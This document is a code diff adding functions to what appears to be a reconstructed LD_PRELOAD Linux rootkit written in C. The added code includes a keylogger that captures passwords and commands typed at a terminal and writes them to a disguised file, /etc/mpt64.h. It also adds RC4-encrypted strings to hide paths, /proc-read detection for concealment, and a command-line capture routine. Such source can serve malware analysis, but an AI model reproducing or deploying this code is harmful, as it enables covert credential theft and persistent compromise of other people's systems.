@@ -1,5 +1,7 @@
+#include <dirent.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <stdbool.h>
 #include <stddef.h>
 #include <stdlib.h>
 #include <string.h>
@@ -115,6 +117,17 @@ char *strchr_reverse(char *str, char c) {
   return NULL;
 }
 
+int endswith(char *s1, int len1, char *s2, int len2) {
+  int j = len2 - 1;
+
+  for (int i = len1; i >= 0 && s1[i] == s2[j]; i--) {
+    if (--j == -1)
+      return 1;
+  }
+
+  return 0;
+}
+
 extern execve_fn orig_execve;
 #define MT64_SO_ENC "\x3A\xA2\xCC\x01\xBB\x5F\x88"
 
@@ -123,7 +136,6 @@ int fake_trace_objects(const char *pathname, char *const argv[],
   int status;
   int pipefd[2];
   char mt64_so[8];
-  int v12;
   int size;
   int readc;
   int i;
@@ -186,4 +198,156 @@ int fake_trace_objects(const char *pathname, char *const argv[],
 
   errno = (status & 0xFF00) >> 8;
   return -1;
+}
+
+#define PROC_SELF_FD_D_ENC "\x78\xA6\x88\x5A\xF6\x03\x94\xD3\xA9\x29\x09\xF5\x77\x7A\x4D\x0B"
+#define PROC_ENC "\x78\xA6\x88\x5A\xF6"
+
+bool check_proc(DIR *dirp) {
+  char buf[16];
+  char s[64];
+  char proc_self_fd_d[17];
+  char proc[6];
+  int fd;
+  ssize_t size;
+
+  fd = dirfd(dirp);
+  if (fd == -1)
+    return 0;
+
+  // "/proc/self/fd/%d"
+  strcpy(proc_self_fd_d, PROC_SELF_FD_D_ENC);
+  sprintf(s, rc4(key, proc_self_fd_d, 16), fd);
+  size = readlink(s, buf, 6);
+  if (size != 5)
+    return 0;
+
+  s[5] = '\0';
+  // "/proc"
+  strcpy(proc, PROC_ENC);
+  //     strcmp("/proc",           s) == 0;
+  return strcmp(rc4(key, proc, 5), s) == 0;
+}
+
+int index_5914;
+unsigned char pw_5911[4096];
+int times_5915;
+char *cmdline_5912;
+char *addr_5913;
+uint32_t enable_hook_5776;
+
+#define STR_PIPE_STR_ENC "\x72\xA5\x86\x10\xE6\x26"
+#define ETC_MPT64_H_ENC "\x78\xB3\x8E\x56\xBA\x41\x97\xC2\xF3\x7B\x08\xFB"
+
+uint32_t enable_hook_5776;
+
+int keylogger(int fd, uint8_t *buf, size_t count, uint32_t *enable_switch) {
+  int res;
+  char str_pipe_str[7];
+  char etc_mpt64_h[13];
+
+  if (!isatty(fd))
+    return 0;
+
+  for (size_t i = 0;; i++) {
+    int max_len;
+    char *s;
+
+    res = i;
+    if (i >= count)
+      break;
+
+    pw_5911[index_5914] = buf[i];
+    if (pw_5911[index_5914] == '\0')
+      pw_5911[index_5914] = '*';
+
+    index_5914++;
+    if (buf[i] == '\n' || buf[i] == '\r' || index_5914 == 4095) {
+      if (pw_5911[index_5914 - 1] == '\n')
+        index_5914--;
+
+      pw_5911[index_5914] = '\0';
+      if (times_5915 == 0)
+        cmdline_5912 = log_cmd_line();
+
+      max_len = index_5914 + 12;
+      max_len += cmdline_5912 != NULL ? strlen(cmdline_5912) : 6;
+      max_len += addr_5913 != NULL ? strlen(addr_5913) : 6;
+      s = malloc(max_len);
+      if (s != NULL) {
+        // "%s|%s\n"
+        strcpy(str_pipe_str, STR_PIPE_STR_ENC);
+        snprintf(s, max_len, rc4(key, str_pipe_str, 12),
+                 cmdline_5912, pw_5911);
+        // "/etc/mpt64.h"
+        strcpy(etc_mpt64_h, ETC_MPT64_H_ENC);
+        savepasswd(rc4(key, etc_mpt64_h, 12), s);
+        erasefree(s);
+      }
+
+      index_5914 = 0;
+      // yes, this is a bug in the original code
+      memset(pw_5911, 0, index_5914);
+      times_5915++;
+      if (times_5915 == 2) {
+        erasefree(cmdline_5912);
+        erasefree(addr_5913);
+        res = (int)enable_switch;
+        *enable_switch = 1;
+        return res;
+      }
+    }
+  }
+
+  return res;
+}
+
+#define PROC_SELF_CMDLINE_ENC "\x78\xA6\x88\x5A\xF6\x03\x94\xD3\xA9\x29\x09\xF0\x7E\x31\x04\x06\xD8\x50"
+
+extern read_fn orig_read;
+
+char *log_cmd_line(void) {
+  char buf[1024];
+  char proc_self_cmdline[19];
+  char *ptr;
+  size_t size;
+  int idx;
+  int i;
+  int fd;
+  size_t current_size;
+
+  ptr = NULL;
+  size = 0;
+  idx = 0;
+  // "/proc/self/cmdline"
+  strcpy(proc_self_cmdline, PROC_SELF_CMDLINE_ENC);
+  fd = open(rc4(key, proc_self_cmdline, 18), O_RDONLY);
+  if (fd == -1)
+    return NULL;
+
+  while (1) {
+    void *tmp;
+
+    current_size = orig_read(fd, buf, 1024);
+    if (current_size <= 0)
+      break;
+    size += current_size;
+    tmp = realloc(ptr, size + 1);
+    if (tmp == NULL)
+      break;
+
+    ptr = tmp;
+    for (i = 0; (int)current_size > i; i++) {
+      if (buf[i] == '\0')
+        buf[i] = ' ';
+      ptr[idx] = buf[i];
+      idx++;
+    }
+  }
+
+  if (idx != 0)
+    ptr[idx] = 0;
+
+  close(fd);
+  return ptr;
 }
